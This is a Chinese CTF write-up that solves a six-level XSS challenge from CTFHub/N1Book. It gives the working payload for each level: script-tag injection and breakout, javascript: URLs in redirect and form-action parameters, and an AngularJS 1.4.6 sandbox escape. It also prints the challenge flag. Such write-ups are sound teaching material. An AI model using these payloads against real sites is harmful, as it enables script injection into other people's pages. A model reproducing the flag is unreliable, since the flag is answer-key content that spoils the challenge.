---
title: WriteUp-CTFHub-XSS闯关
date: 2024-02-20 22:25:58
categories: 
    - CTF-WriteUp
tags: 
    - XSS
description: N1Book-第二章Web进阶-XSS的魔力-XSS闯关
---
<!-- more -->

## 题目考点

- WEB
- XSS

## 解题思路

> 本环境为闯关形式，每过一关即可进入下一关,过关目标为利用XSS漏洞在页面执行alert函数

- level1
  - 设置`username=<script>alert("flag")</script>`，过关
    ![](level1.png)
- level2
  - 输入level1同样的payload，没有反应，查看网页源码，发现`</script>`闭合了原本的script标签，所以无法执行alert函数
  - 修改payload为`username=</script><script>alert("flag")</script>`，过关
    ![](level2-1.png)
- level3
  - 输入level1同样的payload同样没有反应，查看网页源码，似乎问题和level2一样
    ![](level3-1.png)
  - 使用level2同样的paload，过关
    ![](level3-2.png)
- level4
  - 查看网页源码，发现`jumpUrl`参数可以控制跳转的url：
    ![](level4-1.png)
    ```js
        <script type="text/javascript">
    	var time = 10;
    	var jumpUrl;
    	if(getQueryVariable('jumpUrl') == false){
    		jumpUrl = location.href;
    	}else{
    		jumpUrl = getQueryVariable('jumpUrl');
    	}
    	setTimeout(jump,1000,time);
    	function jump(time){
    		if(time == 0){
    			location.href = jumpUrl;
    		}else{
    			time = time - 1 ;
    			document.getElementById('ccc').innerHTML= `页面${time}秒后将会重定向到${escape(jumpUrl)}`;
    			setTimeout(jump,1000,time);
    		}
    	}
		function getQueryVariable(variable)
		{
		       var query = window.location.search.substring(1);
		       var vars = query.split("&");
		       for (var i=0;i<vars.length;i++) {
		               var pair = vars[i].split("=");
		               if(pair[0] == variable){return pair[1];}
		       }
		       return(false);
		}
    </script>
    ```
  - 所以基于JavaScript为协议，可以构造payload为`jumpUrl=javascript:alert("flag")`，过关
    ![](level4-2.png)
- level5
  - 输入level1同样的payload无效，查看网页源码：
    ```js
    <script type="text/javascript">
    if(getQueryVariable('autosubmit') !== false){
        var autoForm = document.getElementById('autoForm');
        autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action');
        autoForm.submit();
    }else{
        
    }
    function getQueryVariable(variable)
    {
            var query = window.location.search.substring(1);
            var vars = query.split("&");
            for (var i=0;i<vars.length;i++) {
                    var pair = vars[i].split("=");
                    if(pair[0] == variable){return pair[1];}
            }
            return(false);
    }
    </script>
    ```
  - 这段代码的意思是，如果`autosubmit`参数存在，则自动提交表单
  - 所以构造payload为`autosubmit=1&action=javascript:alert("flag")`，过关
    ![](level5.png)
- level6
  - 输入level1同样的payload没有反应，查看网页源码，发现使用了`AnjularJS`框架
    ```html
    <script src="https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js"></script>
    ```
    ![](level6-1.png)
  - 搜索`AnjularJS`框架XSS漏洞，发现Angular(版本号小于1.6)内的典型XSS payload为`username={{7*7}}`，测试后发现确实存在XSS漏洞
    ![](level6-2.png)
  - 使用payload`{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert("flag")//');}}`进行沙箱逃逸，过关
    ![](level6-3.png)
- 完成所有关卡，获得flag
  ![](flag.png)

## FLAG

```plaintext
n1book{xss_is_so_interesting}
```

## 参考链接

- [AngularJS Sandbox Bypasses - 先知社区](https://xz.aliyun.com/t/4638)
- [BuuCTF[第二章 web进阶]XSS闯关_[第二章 web进阶]xss闯关 1-CSDN博客](https://blog.csdn.net/m_de_g/article/details/119085955)
- [Angular Js XSS漏洞_angularjs v1.4.6版本xss漏洞-CSDN博客](https://blog.csdn.net/qq_32393893/article/details/104923733)